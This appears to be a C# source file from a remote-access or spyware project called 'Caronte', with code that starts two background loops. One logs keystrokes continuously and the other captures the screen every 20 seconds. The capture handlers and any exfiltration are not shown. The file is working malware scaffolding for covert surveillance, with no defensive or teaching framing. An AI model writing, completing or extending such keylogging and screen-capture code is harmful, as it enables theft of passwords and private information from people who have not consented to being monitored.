using Caronte.Modules.Information.GetClientPrintScreen;
using Caronte.Modules.Information.GetKeyboardLog;
using MediatR;
using System;
using System.Threading;
using System.Threading.Tasks;

namespace Caronte.Modules.Information
{
    public static class StartInformationServices
    {
        public static Task KeyboardLog(CancellationToken _cancellationToken, IMediator _mediator)
        {
            var logTask = Task.Run(async () =>
            {
                while (!_cancellationToken.IsCancellationRequested)
                    await _mediator.Send(new GetKeyboardLogQuery());
            }, _cancellationToken);

            return logTask;
        }

        public static Task PrintScreen(CancellationToken _cancellationToken, IMediator _mediator)
        {
            var printScreenTask = Task.Run(async () =>
            {
                while (!_cancellationToken.IsCancellationRequested)
                {
                    await _mediator.Send(new PrintScreenQuery());
                    await Task.Delay(TimeSpan.FromSeconds(20), _cancellationToken);
                }
            }, _cancellationToken);

            return printScreenTask;
        }
    }
}
